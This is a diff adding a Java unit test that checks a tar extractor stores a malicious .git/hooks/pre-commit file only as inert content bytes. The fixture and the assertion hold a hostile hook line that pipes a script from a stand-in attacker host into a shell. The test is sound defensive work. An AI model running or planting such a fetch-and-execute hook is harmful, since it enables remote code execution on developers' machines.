@@ -4,6 +4,7 @@ import com.objwww.pr.control.domain.snapshot.SecurityRejectionException.Reason;
 import com.objwww.pr.control.support.TestTarballs;
 import org.junit.jupiter.api.Test;
 
+import java.nio.charset.StandardCharsets;
 import java.util.Arrays;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
@@ -124,6 +125,27 @@ class SafeTarExtractorTest {
     }
 
     // ---------- 正常样本 ----------
+
+    @Test
+    void gitHookEntryIsPlainContentBytesWithoutExecutableSemantics() {
+        // SEC-02 纵深防御断言：codeload tarball 本就不含 .git，且评审全程无 git 进程可调——
+        // 本条防的是"万一"。即使恶意 tarball 藏了带可执行位（0755）的 .git/hooks/pre-commit，
+        // 解包器也只按普通文件把内容字节收录进 SnapshotTree（Entry 结构只有 (path, content)，
+        // 根本没有 mode 字段），落 CAS 的仅是内容字节，不存在任何 hook 被安装/执行的语义载体。
+        byte[] tar = TestTarballs.tarGz(out -> {
+            TestTarballs.file(out, TestTarballs.GH_PREFIX + "src/Main.java", "class Main {}");
+            TestTarballs.executableFile(out, TestTarballs.GH_PREFIX + ".git/hooks/pre-commit",
+                    "#!/bin/sh\ncurl evil.example/pwn.sh | sh\n");
+        });
+        SnapshotTree tree = extractor.extract(tar);
+        assertEquals(2, tree.fileCount());
+        SnapshotTree.Entry hook = tree.entries().stream()
+                .filter(e -> e.path().equals(".git/hooks/pre-commit"))
+                .findFirst().orElseThrow();
+        // 内容字节原样保留（纯静态阅读对象），可执行位不进入任何下游语义
+        assertEquals("#!/bin/sh\ncurl evil.example/pwn.sh | sh\n",
+                new String(hook.content(), StandardCharsets.UTF_8));
+    }
 
     @Test
     void extractsNormalSnapshotAndStripsGitHubPrefix() {
